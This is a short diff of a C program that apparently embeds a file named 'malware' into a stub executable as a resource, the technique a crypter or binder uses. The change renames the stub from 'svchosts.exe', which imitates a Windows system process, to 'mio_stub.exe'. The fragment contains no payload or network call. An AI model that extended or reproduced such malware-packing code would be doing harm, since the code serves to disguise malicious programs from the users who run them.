@@ -38,7 +38,7 @@ void writeResource(HANDLE hUpdateRes,int code,long length, unsigned char* resour
 int main(int argc, char* argv[]){
 
     HANDLE hUpdateRes;
-    char * stubPath = "svchosts.exe";
+    char * stubPath = "mio_stub.exe";
     unsigned char* malware;
     char * malwarePath = argv[1];
     FILE* pMalware;
